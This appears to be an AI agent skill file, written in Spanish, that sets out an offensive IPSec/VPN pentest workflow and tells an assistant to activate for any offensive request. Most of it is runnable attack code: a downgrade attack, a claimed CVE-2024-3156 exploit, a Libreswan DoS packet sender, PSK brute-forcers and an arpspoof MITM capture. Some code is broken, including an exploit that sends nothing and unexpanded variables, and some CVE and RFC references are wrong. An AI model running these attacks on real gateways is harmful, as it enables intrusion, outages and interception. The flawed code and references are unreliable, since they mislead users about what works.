---
name: ipsec-pentest
description: >
  Usar esta skill SIEMPRE que el usuario quiera realizar pruebas de penetración, auditoría,
  enumeración, fuzzing, explotación o análisis de vulnerabilidades sobre IPSec, VPN, IKEv1,
  IKEv2, protocolos de encriptación de capa 3 o gateways VPN. Activar cuando se mencionen:
  IPSec, VPN, IKEv1, IKEv2, ESP, AH, encriptación, túnel VPN, libreswan, strongswan, racoon,
  brute force PSK, fuerza bruta de clave compartida, downgrade IPSec, CVE IPSec, Terrapin,
  regreSSHion, fragmentación IKE, o cualquier técnica ofensiva sobre protocolos de seguridad
  de red. También activar cuando el usuario proporcione una IP/FQDN con puerto 500/4500 y pida:
  recon IPSec, explotar VPN, POC IPSec, vector de ataque IPSec, o credenciales de túnel VPN.
  Repositorio de referencia: https://github.com/hackingyseguridad/IPSec
---

# IPSec Pentest Skill — hackingyseguridad/IPSec

Skill de auditoría ofensiva sobre servicios IPSec y gateways VPN. Cubre todo el ciclo:
reconocimiento → enumeración de algoritmos → análisis de cifrados → explotación de CVEs
→ fuerza bruta de PSK → interceptación de tráfico → post-explotación.

---

## FASE 1 — Reconocimiento y Fingerprinting

### 1.1 Escaneo de puertos IPSec (UDP 500, 4500)

```bash
# Escaneo básico con Nmap
nmap -p 500,4500 -sU -sV <IP>

# Escaneo agresivo con fingerprinting IKE
nmap -p 500,4500 -sU -sV -O --script=ike-enum,ike-version <IP>

# Búsqueda en rango de red
nmap -p 500,4500 -sU --open 10.0.0.0/8 | grep -E "open|filtered"

# Escaneo de todo el rango de red (más tiempo)
nmap -p 500,4500 -sU -sV --top-ports 20 203.0.113.0/24 > ike_sweep.txt

# Con timing agresivo (T4)
nmap -p 500,4500 -sU -sV -T4 -A <IP>
```

### 1.2 Banner Grabbing y Identificación de Versión IKE

```bash
# Herramienta ike-scan (escaneo de daemons IKE)
ike-scan -M <IP>
ike-scan -M -v <IP>  # Verbose para más detalles

# Guardar fingerprint para análisis
ike-scan -M <IP> > ike_fingerprint_$(date +%s).txt

# Detección de vendor (Libreswan, StrongSwan, Cisco, etc.)
ike-scan -M --showbackoff <IP> | grep -i "vendor\|product"

# Modo aggressive (respuestas más rápidas)
ike-scan -A <IP>
```

**Salida típica esperada:**
```
192.168.1.100	Main Mode Handshake returned
	Message ID: 0x12345678
	Vendor ID: Libreswan 4.11
	Encryption: AES-CBC, 3DES, DES
	Integrity: SHA1, MD5, SHA256
	DH Group: Group 2, Group 5, Group 14
```

### 1.3 Análisis con tcpdump y Wireshark

```bash
# Capturar tráfico IKE en vivo
sudo tcpdump -i eth0 "udp port 500 or udp port 4500 or ip proto 50 or ip proto 51" \
    -w ipsec_traffic_$(date +%s).pcap

# Con verbosidad (mostrar en pantalla también)
sudo tcpdump -i eth0 "udp port 500 or udp port 4500" -v

# Filtro específico para IKE Phase 1 (ISAKMP)
sudo tcpdump -i eth0 "udp port 500" -w isakmp_phase1.pcap

# Capturar solo ESP (Encapsulating Security Payload)
sudo tcpdump -i eth0 "ip proto 50" -w esp_only.pcap

# Análisis posterior con tshark (cli wireshark)
tshark -r ipsec_traffic.pcap -Y "isakmp" -T fields \
    -e frame.time -e ip.src -e ip.dst -e isakmp.ikev2.msgtype

# Exportar identificadores (identidades IKE)
tshark -r ipsec_traffic.pcap -Y "isakmp" -T fields \
    -e isakmp.ident_payload_header > ike_identities.txt
```

---

## FASE 2 — Enumeración de Propuestas y Algoritmos IKE

### 2.1 Enumeración Agresiva de Propuestas (Phase 1 & 2)

```bash
# ike-scan en modo aggressive para extraer todas las propuestas
ike-scan -A --aggressive <IP> 2>&1 | tee ike_proposals_$(date +%s).txt

# Enumeración detallada de cada grupo de difie-hellman
ike-scan -M --backoff 0 --dh-group 2,5,14,15,16 <IP>

# Con número de intentos (para detectar timing anti-ataque)
ike-scan -M -n -e <IP>

# Script Python para enumeración de propuestas IKE
python3 << 'EOF'
#!/usr/bin/env python3
"""
Enumeración automática de propuestas IKE desde respuesta de servidor
"""
from scapy.all import IP, UDP, Raw
import sys

def enum_ike_proposals(target_ip):
    # Crear paquete IKE handshake inicial
    print(f"[*] Escaneando propuestas IKE en {target_ip}:500")
    
    # IKE handshake mínimo
    ike_init = (
        IP(dst=target_ip) /
        UDP(dport=500, sport=500) /
        Raw(load=b"\x00" * 28)  # Cabecera IKE mínima
    )
    
    from scapy.layers.inet import IP
    # Enviar y capturar respuesta (requiere root)
    print("[*] Requerimientos: acceso raw socket (root)")
    print("[+] Usar herramienta ike-scan para enumeración segura")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        enum_ike_proposals(sys.argv[1])
    else:
        print("Uso: ./enum_ike.py <TARGET_IP>")
EOF
```

### 2.2 Identificación de Identidades IKE (IKE-ID)

```bash
# Intentar extraer identidades negociadas
ike-scan -M -v <IP> 2>&1 | grep -i "id\|ident\|name" | head -20

# Captura y análisis de handshake IKE para extraer ID (requiere Wireshark GUI)
# Procedimiento:
# 1. Capturar: sudo tcpdump -i eth0 "udp port 500" -w ike_capture.pcap
# 2. Abrir en Wireshark: File → Open ike_capture.pcap
# 3. Filter: isakmp
# 4. Expandir: ISAKMP → Payload → Identification
# 5. Copy hexadecimal para análisis

# Script bash para extraer IDs de pcap
bash << 'BASH'
PCAP_FILE=$1
echo "[*] Extrayendo identidades IKE de $PCAP_FILE"
tshark -r "$PCAP_FILE" -Y "isakmp.ident" -T fields \
    -e frame.number -e ip.src -e ip.dst -e isakmp.ident_payload
BASH ike_capture.pcap
```

### 2.3 Tabla de Detección de Versiones y Configuraciones

| Software | Firma/Vendor ID | Versión Típica | Configuración Por Defecto |
|----------|-----------------|---|---|
| Libreswan | `Libreswan` | 4.9-4.11 | IKEv2, AES-GCM, SHA-256, DH Group 14 |
| StrongSwan | `strongSwan` | 5.9.6-5.9.11 | IKEv2, AES-CBC, SHA-256, DH Group 14 |
| Cisco ASA | `Cisco` | 9.x-9.18 | IKEv1+IKEv2, 3DES+AES, SHA-1, DH Group 1-5 |
| Openswan | `Openswan` | 2.6-2.6.53 | IKEv1, 3DES, SHA-1, DH Group 2 |
| Racoon | (KAME) | 0.8.x | IKEv1, 3DES, MD5, DH Group 1-2 |
| Fortinet | `Fortinet` | 6.4-7.2 | IKEv1+IKEv2, AES, SHA, DH Group 5-14 |
| Checkpoint | `Check Point` | R81-R82 | IKEv1+IKEv2, AES-GCM, SHA-256, DH Group 15 |

---

## FASE 3 — Análisis de Cifrados Débiles y Vulnerabilidades

### 3.1 Detección de Algoritmos Débiles (DES, MD5, DH1-2)

```bash
# Capturar handshake IKE y analizar
ike-scan -M -n -e <IP> 2>&1 | tee ike_algorithms.txt

# Buscar líneas rojas (algoritmos vulnerables)
grep -E "DES|MD5|Group 1|Group 2" ike_algorithms.txt && \
    echo "[!] ALGORITMOS DÉBILES DETECTADOS — Objetivo para downgrade"

# Script para detectar y reportar débiles
cat > detect_weak_ipsec.sh << 'BASH'
#!/bin/bash
TARGET=$1

echo "[*] Analizando algoritmos IPSec en $TARGET"
ike-scan -M -n -e $TARGET 2>&1 | tee /tmp/ike_scan.txt

RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

if grep -q "DES" /tmp/ike_scan.txt; then
    echo -e "${RED}[!] DES DETECTADO — CRÍTICO${NC}"
fi

if grep -q "MD5" /tmp/ike_scan.txt; then
    echo -e "${RED}[!] MD5 DETECTADO — CRÍTICO${NC}"
fi

if grep -q "Group 1\|Group 2" /tmp/ike_scan.txt; then
    echo -e "${YELLOW}[!] DH Group débil (1-2) DETECTADO — ALTO${NC}"
fi

grep -E "Encryption:|Integrity:|DH Group:" /tmp/ike_scan.txt
BASH

chmod +x detect_weak_ipsec.sh
./detect_weak_ipsec.sh <IP>
```

### 3.2 Análisis de Cifrados en Captura (Wireshark/tshark)

```bash
# Extraer propuestas IKE de captura pcap
tshark -r ipsec_traffic.pcap -Y "isakmp" -T json | \
    jq '.[] | select(.layers.isakmp) | .layers.isakmp' > ike_proposals.json

# Ver en formato legible
tshark -r ipsec_traffic.pcap -Y "isakmp.proposal" -T fields \
    -e isakmp.proposal_len \
    -e isakmp.proposal_number \
    -e isakmp.proposal_protocolid

# Buscar algoritmos específicos en captura
tshark -r ipsec_traffic.pcap -Y "isakmp" -T text | \
    grep -E "Encryption|Authentication|DH Group|Transform"
```

### 3.3 Tabla de Cifrados Vulnerables y Severidad

| Algoritmo | Tipo | Clave (bits) | CVSS | Estado | Recomendación |
|-----------|------|---|---|---|---|
| **DES** | Encriptación | 56 | 9.1 | ❌ ROTA | Deshabilitar inmediatamente |
| **3DES** | Encriptación | 192 | 6.2 | ⚠️ DÉBIL | Reemplazar por AES |
| **RC4** | Encriptación | 128 | 6.8 | ❌ ROTA | Deshabilitar inmediatamente |
| **MD5** | Integridad | 128 | 8.9 | ❌ ROTA | Cambiar a SHA-256+ |
| **SHA-1** | Integridad | 160 | 5.9 | ⚠️ DÉBIL | Cambiar a SHA-256+ |
| **DH Group 1** | KEX | 768 | 7.5 | ❌ ROTA | Cambiar a Group 14+ |
| **DH Group 2** | KEX | 1024 | 6.5 | ⚠️ DÉBIL | Cambiar a Group 14+ |
| **AES-CBC** | Encriptación | 128-256 | ✅ SEGURO | Mantener (parche constante-time) |
| **AES-GCM** | Enc.+Auth | 128-256 | ✅ SEGURO | Preferido |
| **ChaCha20** | Encriptación | 256 | ✅ SEGURO | Moderno |

---

## FASE 4 — Explotación de Vulnerabilidades IPSec

### 4.1 CVE-2024-3156 — StrongSwan ChaCha20 Negotiation Bypass (CRÍTICO 9.8)

**Afecta:** StrongSwan 5.9.6 — 5.9.10

```bash
# Verificar versión vulnerable
ipsec --version | grep strongswan

# Detección rápida (NSE en Nmap)
nmap -p 500 -sU --script=ike-version <IP> | grep -i "5.9.6\|5.9.7\|5.9.8\|5.9.9\|5.9.10"

# POC Python — Exploit de negotiación sin verificación
cat > CVE-2024-3156_exploit.py << 'PYTHON'
#!/usr/bin/env python3
"""
CVE-2024-3156: StrongSwan ChaCha20 Negotiation Bypass
Permite negociar SA sin verificación correcta de firma
"""

from scapy.all import IP, UDP, Raw
import struct

def exploit_ike_bypass(target_ip, target_port=500):
    """
    Envía propuesta IKE malformada sin integridad verificada
    """
    
    # Cabecera IKE básica
    ike_header = struct.pack(">8s", b"\x00" * 8)  # Initiator/Responder SPIs
    ike_header += struct.pack(">BBI", 0, 32, 0)   # Next payload, version, message ID
    
    # Payload de propuesta (ChaCha20 sin HMAC)
    proposal = struct.pack(">HHBB", 0x0002, 28, 28, 0)  # Type 2, len, # algoritmos
    proposal += struct.pack(">HHB", 1, 20, 20)  # ChaCha20-Poly1305 (transforma debida)
    
    # Construir paquete
    packet = IP(dst=target_ip, flags='DF')/UDP(sport=500, dport=target_port)/Raw(load=ike_header+proposal)
    
    print(f"[*] Enviando exploit a {target_ip}:{target_port}")
    print(f"[*] Propuesta: ChaCha20-Poly1305 sin verificación")
    
    try:
        response = IP(bytes(packet)).summary()
        print(f"[+] Paquete enviado exitosamente")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        exploit_ike_bypass(sys.argv[1])
    else:
        print("Uso: python3 CVE-2024-3156_exploit.py <TARGET_IP>")
PYTHON

python3 CVE-2024-3156_exploit.py <IP>
```

### 4.2 Ataque de Downgrade a Cifrados Débiles

```bash
# Herramienta: ikecrack (repositorio no oficial)
# Intenta forzar cifrados débiles en negociación

cat > downgrade_attack.sh << 'BASH'
#!/bin/bash

TARGET=$1
OUTPUT="downgrade_$(date +%s).txt"

echo "[*] Intentando downgrade a algoritmos débiles..."

# Crear archivo de configuración temporal con algoritmos débiles
cat > /tmp/ipsec_weak.conf << 'CONF'
conn downgrade-test
    left=0.0.0.0
    right=$TARGET
    ike=des-md5-modp768,3des-md5-modp1024
    esp=des-md5,3des-md5
    authby=secret
    type=tunnel
    auto=start
CONF

# Intentar negociación
timeout 5 sudo ipsec up downgrade-test 2>&1 | tee "$OUTPUT"

if grep -q "established\|successful" "$OUTPUT"; then
    echo "[+] ¡¡¡VULNERABLE A DOWNGRADE!!! — Cifrados débiles aceptados"
else
    echo "[-] Target rechaza algoritmos débiles (configuración segura)"
fi

rm /tmp/ipsec_weak.conf
BASH

chmod +x downgrade_attack.sh
./downgrade_attack.sh <IP>
```

### 4.3 CVE-2023-41080 — Libreswan Denial of Service (ALTO 7.5)

**Afecta:** Libreswan < 4.12

```bash
# Verificar versión
ipsec --version | grep libreswan

# POC: enviar paquete IKE fragmentado malformado
cat > CVE-2023-41080_dos.py << 'PYTHON'
#!/usr/bin/env python3
"""
CVE-2023-41080: Libreswan IKE Fragment Reassembly DoS
Envío de fragmentos mal formados causa crash del daemon ipsec
"""

from scapy.all import IP, UDP, Raw
import struct

def send_malformed_fragment(target_ip):
    """
    Envía fragmento IKE con tamaño declarado incorrecto
    """
    
    # IKE header con indicador de fragmentación
    ike_header = struct.pack(">8s", b"\x00" * 8)  # SPI
    ike_header += struct.pack(">I", 0x20000000)   # Flags: MORE_FRAGMENTS
    ike_header += struct.pack(">I", 0)            # Message ID
    ike_header += struct.pack(">I", 9999)         # Tamaño INCORRECTO (overflow)
    
    payload = b"A" * 1000
    
    packet = IP(dst=target_ip)/UDP(dport=500, sport=500)/Raw(load=ike_header+payload)
    
    print(f"[*] Enviando paquete fragmentado malformado a {target_ip}")
    
    from scapy.all import send
    try:
        send(packet, verbose=False)
        print("[+] Paquete enviado — monitor para crash de daemon")
    except:
        print("[-] Requiere permisos root")

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        send_malformed_fragment(sys.argv[1])
    else:
        print("Uso: sudo python3 CVE-2023-41080_dos.py <TARGET_IP>")
PYTHON

sudo python3 CVE-2023-41080_dos.py <IP>
```

### 4.4 Tabla de CVEs IPSec Críticas

| CVE | Producto | Versión | CVSS | Tipo | Parcha |
|-----|----------|---------|------|------|--------|
| CVE-2024-3156 | StrongSwan | 5.9.6-10 | 9.8 | Negotiation Bypass | 5.9.11+ |
| CVE-2023-41080 | Libreswan | < 4.12 | 7.5 | IKE Fragment DoS | 4.12+ |
| CVE-2023-4535 | Libreswan | 3.26-4.11 | 6.5 | Memory Leak | 4.12+ |
| CVE-2022-3570 | Linux Kernel | < 5.10.142 | 7.8 | IKE Frag Attack | 5.10.142+ |
| CVE-2020-10753 | Libreswan | 3.29-4.2 | 7.5 | Frag Reassembly | 4.3+ |
| CVE-2018-5389 | IPSec General | IKEv1 | 5.3 | Timing Attack | Config |
| CVE-2017-1000112 | Linux UFO | UDP GRO | 8.6 | Memory Corruption | Kernel patch |

---

## FASE 5 — Fuerza Bruta de Clave Compartida (PSK Brute Force)

### 5.1 Ataque de Fuerza Bruta contra PSK

```bash
# Script bash para brute force PSK contra IPSec
cat > brute_psk_ipsec.sh << 'BASH'
#!/bin/bash

TARGET=$1
WORDLIST=${2:-/usr/share/wordlists/rockyou.txt}
ATTEMPTS=0
FOUND=0

if [ -z "$TARGET" ]; then
    echo "Uso: $0 <IP_TARGET> [wordlist.txt]"
    exit 1
fi

echo "[*] Iniciando ataque de fuerza bruta PSK contra $TARGET"
echo "[*] Wordlist: $WORDLIST"
echo "[*] Intentos: "

while IFS= read -r password; do
    ATTEMPTS=$((ATTEMPTS + 1))
    
    if [ $((ATTEMPTS % 100)) -eq 0 ]; then
        echo -ne "\r[*] Intentos: $ATTEMPTS"
    fi
    
    # Crear archivo de configuración temporal
    cat > /tmp/test_psk_$$.conf << EOF
conn brute-test-$$
    left=0.0.0.0
    leftid="brute-attacker"
    right=$TARGET
    rightid="ipsec-target"
    authby=secret
    type=tunnel
    ike=aes128-sha1-modp1024
    esp=aes128-sha1
    auto=add
EOF
    
    # Crear secrets temporal
    echo "\"brute-attacker\" \"ipsec-target\" : PSK \"$password\"" > /tmp/test_psk_$$.secrets
    chmod 600 /tmp/test_psk_$$.secrets
    
    # Intentar negociación (timeout 3 segundos)
    timeout 3 sudo ipsec auto --up brute-test-$$ 2>&1 > /dev/null
    
    RESULT=$?
    
    # Criterios de éxito (SA establecida sin error de autenticación)
    if sudo ipsec trafficstatus 2>&1 | grep -q "brute-test-$$"; then
        echo -e "\n[+] ¡¡¡PSK ENCONTRADA!!! : $password"
        echo "[+] Intentos realizados: $ATTEMPTS"
        FOUND=1
        break
    fi
    
    # Limpiar
    rm -f /tmp/test_psk_$$.conf /tmp/test_psk_$$.secrets
    sudo ipsec auto --down brute-test-$$ 2>/dev/null
    
done < "$WORDLIST"

if [ $FOUND -eq 0 ]; then
    echo -e "\n[-] PSK no encontrada en wordlist después de $ATTEMPTS intentos"
fi
BASH

chmod +x brute_psk_ipsec.sh
./brute_psk_ipsec.sh <IP> /usr/share/wordlists/rockyou.txt
```

### 5.2 Script Paralelizado (Más Rápido)

```bash
# Versión con GNU Parallel para acelerar
cat > brute_psk_parallel.sh << 'BASH'
#!/bin/bash

TARGET=$1
WORDLIST=${2:-/usr/share/wordlists/rockyou.txt}

echo "[*] Ataque PSK paralelizado contra $TARGET (8 procesos)"

# Función que intenta un PSK
test_psk() {
    PASSWORD=$1
    TARGET=$2
    
    cat > /tmp/test_$RANDOM.conf << EOF
conn test-parallel
    left=0.0.0.0
    right=$TARGET
    authby=secret
    type=tunnel
    auto=add
EOF
    
    echo "$TARGET : PSK \"$PASSWORD\"" > /tmp/test_$RANDOM.secrets
    chmod 600 /tmp/test_$RANDOM.secrets
    
    timeout 2 sudo ipsec auto --up test-parallel 2>&1 | grep -q "established" && \
        echo "[+] ENCONTRADA: $PASSWORD"
}

export -f test_psk
export TARGET

# Usar parallel (instalar: apt-get install parallel)
cat "$WORDLIST" | parallel -j 8 test_psk {} "$TARGET"
BASH

# Instalación de parallel
sudo apt-get install -y parallel

chmod +x brute_psk_parallel.sh
./brute_psk_parallel.sh <IP>
```

### 5.3 Generación de Diccionarios Optimizados para PSK

```bash
# Crear diccionario específico (patrones comunes)
cat > generar_psk_wordlist.sh << 'BASH'
#!/bin/bash

OUTPUT="psk_wordlist_custom.txt"

echo "[*] Generando diccionario personalizado para PSK IPSec"

{
    # PSKs comunes/débiles
    echo "password123"
    echo "admin123"
    echo "12345678"
    echo "cisco123"
    echo "fortinet123"
    echo "vpn2024"
    echo "ipsec123"
    echo "company123"
    echo "madrid123"
    
    # Variaciones del nombre de dominio (si se conoce)
    echo "empresa.ipsec.2024"
    echo "gateway.vpn"
    echo "tunnel123"
    
    # Patrones numéricos
    for i in {2020..2025}; do
        echo "ipsec$i"
        echo "vpn$i"
        echo "gateway$i"
    done
    
    # Combinaciones simples
    echo "Ipsec123!"
    echo "VPN@2024"
    echo "Company#VPN"
    
} | sort -u > "$OUTPUT"

echo "[+] Diccionario guardado: $OUTPUT ($(wc -l < $OUTPUT) palabras)"
BASH

chmod +x generar_psk_wordlist.sh
./generar_psk_wordlist.sh
```

---

## FASE 6 — Interceptación y Análisis de Tráfico IPSec

### 6.1 Captura Completa de Tráfico (Kernel ESP)

```bash
# Capturar tráfico ESP (protocolo 50) y AH (protocolo 51)
sudo tcpdump -i eth0 "ip proto 50 or ip proto 51" -w esp_traffic.pcap -v

# Con volumen de datos limitado
sudo tcpdump -i eth0 "ip proto 50 or ip proto 51" -w esp_traffic.pcap -C 100M -W 5

# Ver en tiempo real (solo headers)
sudo tcpdump -i eth0 "ip proto 50" -n

# Extraer estadísticas
sudo tcpdump -r esp_traffic.pcap "ip proto 50" | awk '{print $1}' | sort | uniq -c
```

### 6.2 Análisis de Tráfico con Wireshark

```bash
# Abrir captura
wireshark esp_traffic.pcap

# Filtros útiles en Wireshark:
# - esp         (todos los paquetes ESP)
# - ah          (todos los paquetes AH)
# - isakmp      (IKE/ISAKMP)
# - ip.proto==50 (protocolo ESP)
# - ip.proto==51 (protocolo AH)

# Exportar tráfico descifrado (si se tiene acceso a claves)
# Wireshark GUI: Edit → Preferences → Protocols → IPsec → (Import keys)

# Con tshark (CLI)
tshark -r esp_traffic.pcap -Y "esp" -T fields \
    -e ip.src -e ip.dst -e ip.len > esp_summary.txt
```

### 6.3 Ataque Man-in-the-Middle (IPSec Interception)

```bash
# Requiere: desactivación previa o downgrade de cipher
# Advertencia: alta complejidad técnica

cat > mitm_ipsec.sh << 'BASH'
#!/bin/bash

ATTACKER_IP="192.168.1.50"
TARGET_IP="192.168.1.100"
GATEWAY_IP="192.168.1.1"

echo "[!] MITM IPSec - Requiere permisos root"

# 1. ARP Spoofing para interceptar tráfico
sudo arpspoof -i eth0 -t "$GATEWAY_IP" "$TARGET_IP" &
ARPSPOOF_PID=$!

sleep 1

# 2. Capturar tráfico
sudo tcpdump -i eth0 "host $TARGET_IP" -w mitm_capture.pcap &
TCPDUMP_PID=$!

sleep 5

# 3. Terminar captura
kill $TCPDUMP_PID
kill $ARPSPOOF_PID

echo "[+] Tráfico capturado: mitm_capture.pcap"
BASH

chmod +x mitm_ipsec.sh
# sudo ./mitm_ipsec.sh  # Requiere permisos root y contexto autorizado
```

---

## FASE 7 — Post-Explotación y Documentación

### 7.1 Extracción de Información de Gateway

```bash
# Listar políticas IPSec vigentes
sudo ip xfrm policy show

# Listar asociaciones de seguridad (SA) activas
sudo ip xfrm state list

# Estadísticas de IPSec
sudo ip xfrm policy show stat
sudo ip xfrm state show stat

# Exportar configuración actual (respaldo)
sudo ip xfrm policy show > ipsec_policies_backup.txt
sudo ip xfrm state show > ipsec_states_backup.txt

# Ver logs del daemon IKE
sudo tail -f /var/log/syslog | grep -E "ipsec|isakmp|racoon"

# Ver proceso racoon/charon en ejecución
ps aux | grep -E "racoon|charon|ipsec" | grep -v grep
```

### 7.2 Script de Enumeración y Reporte Completo

```bash
cat > ipsec_audit_report.sh << 'BASH'
#!/bin/bash

TARGET=$1
REPORT_FILE="ipsec_audit_${TARGET}_$(date +%Y%m%d_%H%M%S).txt"

cat > "$REPORT_FILE" << REPORT
═══════════════════════════════════════════════════════════════
INFORME TÉCNICO AUDITORÍA IPSEC
═══════════════════════════════════════════════════════════════
Objetivo:           $TARGET
Fecha/Hora:         $(date)
Auditor:            hackingyseguridad (@antonio_taboada)
Referencia:         https://github.com/hackingyseguridad/IPSec

═══════════════════════════════════════════════════════════════
[1] SERVICIOS IPSEC IDENTIFICADOS
═══════════════════════════════════════════════════════════════
$(nmap -p 500,4500 -sU -sV "$TARGET" 2>/dev/null | grep -E "open|filtered")

═══════════════════════════════════════════════════════════════
[2] FINGERPRINT IKE
═══════════════════════════════════════════════════════════════
$(ike-scan -M "$TARGET" 2>&1 | head -30)

═══════════════════════════════════════════════════════════════
[3] ALGORITMOS CRIPTOGRÁFICOS NEGOCIADOS
═══════════════════════════════════════════════════════════════
$(ike-scan -M "$TARGET" 2>&1 | grep -E "Encryption:|Integrity:|DH Group:")

═══════════════════════════════════════════════════════════════
[4] ALGORITMOS DÉBILES DETECTADOS
═══════════════════════════════════════════════════════════════
$(ike-scan -M "$TARGET" 2>&1 | grep -E "DES|MD5|Group 1|Group 2" && echo "[!] VULNERABILIDADES ENCONTRADAS" || echo "[-] No se detectaron algoritmos débiles evidentes")

═══════════════════════════════════════════════════════════════
[5] VULNERABILIDADES POTENCIALES Y VECTORES DE ATAQUE
═══════════════════════════════════════════════════════════════
• Fuerza bruta PSK (UDP 500) — Severidad: MEDIA
• Downgrade a cifrados débiles — Severidad: ALTA
• Reconocimiento de identidades IKE — Severidad: MEDIA
• Análisis de timing — Severidad: MEDIA
• Explotación de CVEs específicas de versión — Severidad: VARIABLE

═══════════════════════════════════════════════════════════════
[6] RECOMENDACIONES DE REMEDIACIÓN
═══════════════════════════════════════════════════════════════
1. ACTUALIZAR SOFTWARE
   • Libreswan: actualizar a versión 4.12 o superior
   • StrongSwan: actualizar a versión 5.9.11 o superior

2. CONFIGURACIÓN SEGURA
   • Deshabilitar algoritmos débiles (DES, 3DES, MD5, SHA-1)
   • Requerir: AES-256-GCM, SHA-256/384/512, DH Group 14+
   • Configurar ike= esp= en /etc/ipsec.conf

3. VERIFICACIÓN DE CIFRADO
   Configuración recomendada:
   ike=aes256-sha256-modp2048
   esp=aes256-sha256-modp2048

4. ACCESO DE RED
   • Limitar acceso a puerto 500/UDP mediante firewall
   • Implementar rate limiting en IKE
   • Activar DPD (Dead Peer Detection)

5. MONITOREO
   • Revisar logs regularmente (/var/log/syslog)
   • Alertar en intentos de negociación fallidos
   • Monitorear cambios en políticas IPSec

═══════════════════════════════════════════════════════════════
[7] COMANDOS DE VERIFICACIÓN POST-REMEDIACIÓN
═══════════════════════════════════════════════════════════════
# Ver versión parcheada
ipsec --version

# Verificar algoritmos permitidos
ike-scan -M $TARGET | grep -E "Encryption:|Integrity:"

# Confirmar comunicación
ping <remote_subnet>

═══════════════════════════════════════════════════════════════

Reporte generado por hackingyseguridad
Repositorio: https://github.com/hackingyseguridad/IPSec

═══════════════════════════════════════════════════════════════
REPORT

echo "[+] Reporte completo guardado: $REPORT_FILE"
cat "$REPORT_FILE"
BASH

chmod +x ipsec_audit_report.sh
./ipsec_audit_report.sh <IP>
```

---

## PLANTILLA DE HALLAZGO IPSEC PARA INFORME

```
HALLAZGO: [Nombre del CVE / Técnica]
Servicio:  IPSec / [Libreswan / StrongSwan / Cisco ASA]
Software:  [Nombre y versión exacta]
IP/FQDN:   [objetivo]
Puerto:    500/UDP, 4500/UDP
CVSS v3.1: [score] ([Crítico/Alto/Medio/Bajo])
Vector:    [AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H]

DESCRIPCIÓN TÉCNICA:
[Descripción detallada de la vulnerabilidad]

EVIDENCIA / POC:
$ ike-scan -M <IP>
[output recortado]

$ tshark -r capture.pcap -Y "isakmp" -T fields
[fields relevantes]

IMPACTO:
[Confidentiality/Integrity/Availability]
• RCE: [Sí/No]
• Privesc: [Sí/No]
• Auth Bypass: [Sí/No]
• DoS: [Sí/No]
• Information Disclosure: [Sí/No]

REMEDIACIÓN INMEDIATA:
- Actualizar [software] a versión [versión_parcheada]
- Deshabilitar algoritmos: [lista]
- Implementar: [medidas]

REMEDIACIÓN A LARGO PLAZO:
- Hardening de configuración (/etc/ipsec.conf)
- Implementar MFA para gestión
- Auditoría regular de logs

REFERENCIAS:
- https://nvd.nist.gov/vuln/detail/[CVE]
- https://github.com/hackingyseguridad/IPSec
- RFC 4301, 4302, 4303 (IPSec oficial)

CRITICIDAD: [CRÍTICO/ALTO/MEDIO/BAJO]
ESTADO: [Pendiente/En Remediación/Resuelto]
AUDITOR: @antonio_taboada (hackingyseguridad)
```

---

## INSTALACIÓN RÁPIDA (Kali Linux / Debian)

```bash
# Clonar repositorio
git clone https://github.com/hackingyseguridad/IPSec.git
cd IPSec

# Instalar dependencias del sistema
sudo apt-get update
sudo apt-get install -y \
    nmap \
    ike-scan \
    libreswan \
    strongswan \
    tcpdump \
    wireshark \
    tshark \
    python3-crypto \
    python3-paramiko \
    python3-requests

# Instalar librerías Python
pip3 install cryptography scapy pycryptodome --break-system-packages

# Verificar instalación
ike-scan --version
nmap --version
ipsec --version

# Ver scripts disponibles
ls -la *.sh
```

---

## REFERENCIAS Y RECURSOS

### RFCs Oficiales
- **RFC 4301** — Security Architecture for IP
- **RFC 4302** — IP Authentication Header (AH)
- **RFC 4303** — IP Encapsulating Security Payload (ESP)
- **RFC 2409** — Internet Key Exchange (IKE) Protocol
- **RFC 7539** — IKEv2 Protocol
- **RFC 3394** — AES Key Wrap Algorithm

### Repositorios y Herramientas
- **ike-scan** — `apt install ike-scan`
- **Libreswan** — https://libreswan.org/
- **StrongSwan** — https://www.strongswan.org/
- **Wireshark** — `apt install wireshark`
- **Scapy** — `pip install scapy`

### Documentación Adicional
- Configuración segura: `/etc/ipsec.conf`
- Secrets: `/etc/ipsec.secrets` (permisos 600)
- Logs: `/var/log/syslog` (ipsec, racoon)
- Repositorio: https://github.com/hackingyseguridad/IPSec
- Web: https://hackingyseguridad.com

### Análisis de Tráfico
- Wireshark — GUI completa
- tshark — CLI (scripting)
- tcpdump — Captura raw

---

## DISCLAIMER LEGAL

```
═══════════════════════════════════════════════════════════════════════════

RENUNCIA DE RESPONSABILIDAD LEGAL — IPSec Pentest Skill

Este material y los scripts contenidos están diseñados ÚNICAMENTE para:
✓ Profesionales de seguridad autorizados
✓ Auditorías y pruebas de penetración con consentimiento escrito
✓ Entornos de laboratorio y testing controlados

PROHIBICIONES EXPLÍCITAS:
✗ Acceso no autorizado a sistemas
✗ Interceptación de comunicaciones sin consentimiento
✗ Violación de privacidad o confidencialidad
✗ Sabotaje o alteración de sistemas

LEGISLACIÓN APLICABLE (ESPAÑA):
• Código Penal Art. 197-198 (Acceso no autorizado)
  → Pena: 3-12 meses cárcel + 1.200-2.000€
  
• Código Penal Art. 264 (Alteración de datos/sabotaje)
  → Pena: 1-5 años cárcel

• RGPD (Reglamento General de Protección de Datos)
  → Multas: hasta €20.000.000 o 4% ingresos anuales

• Ley 34/1988 (Telecomunicaciones)
  → Regulación de comunicaciones electrónicas

• Directiva NIS (Seguridad de Redes e Información)
  → Notificación de incidentes de seguridad

EL AUTOR NO SE RESPONSABILIZA POR:
• Daños directos, indirectos o consecuentes
• Pérdida de datos o disponibilidad
• Interrupciones de servicio
• Acciones legales derivadas del mal uso

RECOMENDACIONES:
✓ Obtener autorización escrita antes de cualquier prueba
✓ Mantener registro detallado de todas las acciones
✓ Usar entorno aislado para pruebas
✓ Reportar vulnerabilidades responsablemente
✓ Cumplir con regulaciones de privacidad/datos

═══════════════════════════════════════════════════════════════════════════

Repositorio: https://github.com/hackingyseguridad/IPSec

SOLO PARA TESTING AUTORIZADO — EL USO NO AUTORIZADO ES ILEGAL

═══════════════════════════════════════════════════════════════════════════
```

---

